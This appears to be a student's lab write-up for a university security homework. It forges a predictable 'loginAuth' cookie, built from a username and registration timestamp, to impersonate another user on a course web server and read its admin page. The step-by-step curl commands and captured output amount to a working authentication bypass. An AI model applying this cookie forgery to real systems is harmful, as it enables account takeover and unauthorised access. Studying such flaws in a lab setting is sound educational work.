Steps:

(1) Using w3m to access the SERVER and register a new account with
    username "test" and password "test".

(2) Run command

    curl -v -c cookie3.txt -d "username=test&password=test" http://192.168.15.1/login.php

    to log on the SERVER site and to store the cookies used in the file cookie3.txt.
    Then we can get the cookie as follows:
    
    192.168.15.1	FALSE	/	FALSE	0	PHPSESSID	qum824cormjcjskfogrhdpjrl1
    192.168.15.1	FALSE	/	FALSE	0	loginAuth	test2019-11-15T19%3A05%3A31Z

    Hence, we need to create a cookie whose name is loginAuth and value is based on Stephen's profile.

(3) Run command:
    
    curl -k -v https://192.168.15.1/private/profile.php?username=test

    to inspect test's profile:

    <table><tr><th align="right">Name</th><td width="100%"> test</td></tr><tr><th align="right">Date&nbsp;Registered</th><td> Nov 15 2019 13:05:31 pm</td></tr><tr><th align="right">Status</th><td> Living the dream. Doing 5271 homework.</td></tr></table>

    Observe the "Registered Date" field. 
    This is the time string contained in the cookie.

(4) Run command

    curl -k -v https://192.168.15.1/private/profile.php?username=Stephen
    
    to inspect Stephen's profile and get the registered datetime:
     
    <table><tr><th align="right">Name</th><td width="100%"> Stephen</td></tr><tr><th align="right">Date&nbsp;Registered</th><td> Nov 03 2019 06:44:21 am</td></tr><tr><th align="right">Status</th><td> Done with 5271 homework!</td></tr></table>

    Notice that user Stephen is registered at Nov 03 2019 06:44:21.
    We need convert this string to a correct format and involve it in the cookie.
    We also need adjust the timezone and the time difference can be determined 
    by comparing the user test's registered date and user test's cookie value.
    Eventually, we can get the cookie for user Stephen and modify the cookie3.txt as follows:

    192.168.15.1    FALSE   /       FALSE   0       PHPSESSID       qum824cormjcjskfogrhdpjrl1
    192.168.15.1    FALSE   /       FALSE   0       loginAuth       Stephen2019-11-03T12%3A44%3A21Z

(5) Run the following command to get the secret file using the cookie in cookie3.txt:

    curl -k -v -b cookie3.txt https://192.168.15.1/private/admin

    Then we can get the secret file's content as follows. 
    Notice that the content embedded in the <div class="article">...</div> is the secret data:
    
<!doctype html>
<head>
	<title>Admin - CSCI 5271 HA2</title>
	<link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body>

<div class='nav'>
<ul>
<li><a href='https://192.168.15.1/'>Home</a></li>
<li><a href='https://192.168.15.1/private/'>Fun Quotes</a></li>
<li><a href='https://192.168.15.1/thought'>Private Thoughts</a></li>
<li><a href='https://192.168.15.1/comment'>Visitor Comments</a></li>
</ul>

<span class='user_info'>
<ul><li>Signed in as <strong><a href='https://192.168.15.1/private/profile.php?username=Stephen'>Stephen</a></strong></li><li><a href='https://192.168.15.1/logout.php'>Sign out</a></li></ul>
</span>
</div>

<div class="article"><h3>Welcome back, Stephen!</h3><p>You have <strong>5</strong> new messages.</p><table>
		<tr><th>From</th><th>Subject</th></tr>
		<tr><td>Richard Stallman</td><td>Stuck on HA2 problem 3</li>
		<tr><td>Patrick Bateman</td><td> Re: Did you return the textbook?</li>
		<tr><td>Lil Wayne</td><td>Recommendation on papers?</li>
		<tr><td>Travis Carlson</td><td>Delay on grading HA2</li>
		<tr><td>Brad DeLong</td><td> The Ultimate Thanksgiving Movie Is: Addams Family Values</li>
	</table><center><img src="../img/hacking.gif"></center><p>
</div>
</body>
</html>
